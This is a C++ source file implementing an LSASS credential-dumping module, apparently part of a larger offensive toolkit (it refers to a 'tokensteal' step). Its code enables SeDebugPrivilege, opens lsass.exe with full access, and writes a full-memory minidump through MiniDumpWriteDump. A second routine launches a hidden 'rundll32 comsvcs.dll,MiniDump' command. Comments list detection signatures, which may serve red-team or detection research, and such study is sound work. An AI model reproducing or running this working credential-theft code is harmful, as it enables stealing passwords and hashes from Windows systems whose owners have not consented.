#include "LsassDump.h"
#include <tlhelp32.h>
#include <dbghelp.h>
#pragma comment(lib, "dbghelp.lib")

static DWORD FindLsassPid() {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32First(hSnap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "lsass.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return pid;
}

// Enable a named privilege on the current process token.
static bool EnablePrivilege(const char* priv) {
    HANDLE hTok = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok))
        return false;
    TOKEN_PRIVILEGES tp = {};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    LookupPrivilegeValueA(NULL, priv, &tp.Privileges[0].Luid);
    BOOL ok = AdjustTokenPrivileges(hTok, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hTok);
    return ok && GetLastError() == ERROR_SUCCESS;
}

std::string LsassDump::Dump(const std::string& outPath) {
    // SeDebugPrivilege required to open lsass handle
    EnablePrivilege("SeDebugPrivilege");

    DWORD pid = FindLsassPid();
    if (!pid) return "lsass: process not found";

    // Detection: OpenProcess(PROCESS_ALL_ACCESS) on lsass.exe from non-system binary
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) {
        return "lsass: OpenProcess failed err=" + std::to_string(GetLastError()) +
               " (run tokensteal first for SeDebugPrivilege)";
    }

    HANDLE hFile = CreateFileA(outPath.c_str(), GENERIC_WRITE, 0, NULL,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hProc);
        return "lsass: CreateFile failed for " + outPath;
    }

    // MiniDumpWithFullMemory captures every accessible page including credential material.
    // Detection: MiniDumpWriteDump targeting lsass.exe is a tier-1 Windows Defender alert.
    MINIDUMP_TYPE dumpType = (MINIDUMP_TYPE)(
        MiniDumpWithFullMemory       |
        MiniDumpWithHandleData       |
        MiniDumpWithUnloadedModules  |
        MiniDumpWithFullMemoryInfo   |
        MiniDumpWithThreadInfo);

    BOOL ok = MiniDumpWriteDump(hProc, pid, hFile, dumpType, NULL, NULL, NULL);

    DWORD fileBytes = GetFileSize(hFile, NULL);
    CloseHandle(hFile);
    CloseHandle(hProc);

    if (!ok) {
        DeleteFileA(outPath.c_str());
        return "lsass: MiniDumpWriteDump failed err=" + std::to_string(GetLastError());
    }
    return "lsass: dump written -> " + outPath +
           " (" + std::to_string(fileBytes) + " bytes)";
}

std::string LsassDump::DumpViaComsvcs(const std::string& outPath) {
    DWORD pid = FindLsassPid();
    if (!pid) return "lsass: process not found";

    char windir[MAX_PATH] = {};
    GetWindowsDirectoryA(windir, sizeof(windir) - 1);

    std::string rundll32 = std::string(windir) + "\\System32\\rundll32.exe";
    // Detection: rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump <pid> <path> full
    // This pattern is flagged by Sysmon EventID 1 (ProcessCreate) and many EDR rules.
    std::string args = std::string(windir) + "\\System32\\comsvcs.dll,MiniDump " +
                       std::to_string(pid) + " \"" + outPath + "\" full";

    SHELLEXECUTEINFOA sei = {};
    sei.cbSize       = sizeof(sei);
    sei.lpVerb       = "open";
    sei.lpFile       = rundll32.c_str();
    sei.lpParameters = args.c_str();
    sei.nShow        = SW_HIDE;
    sei.fMask        = SEE_MASK_NOCLOSEPROCESS;

    if (!ShellExecuteExA(&sei)) {
        return "lsass (comsvcs): ShellExecuteEx failed err=" + std::to_string(GetLastError());
    }

    if (sei.hProcess) {
        WaitForSingleObject(sei.hProcess, 30000);
        CloseHandle(sei.hProcess);
    }

    DWORD attr = GetFileAttributesA(outPath.c_str());
    if (attr == INVALID_FILE_ATTRIBUTES) {
        return "lsass (comsvcs): dump not created — may need SeDebugPrivilege or SYSTEM token";
    }

    HANDLE hFile = CreateFileA(outPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
    DWORD fileBytes = 0;
    if (hFile != INVALID_HANDLE_VALUE) {
        fileBytes = GetFileSize(hFile, NULL);
        CloseHandle(hFile);
    }

    return "lsass (comsvcs): dump written -> " + outPath +
           " (" + std::to_string(fileBytes) + " bytes)";
}
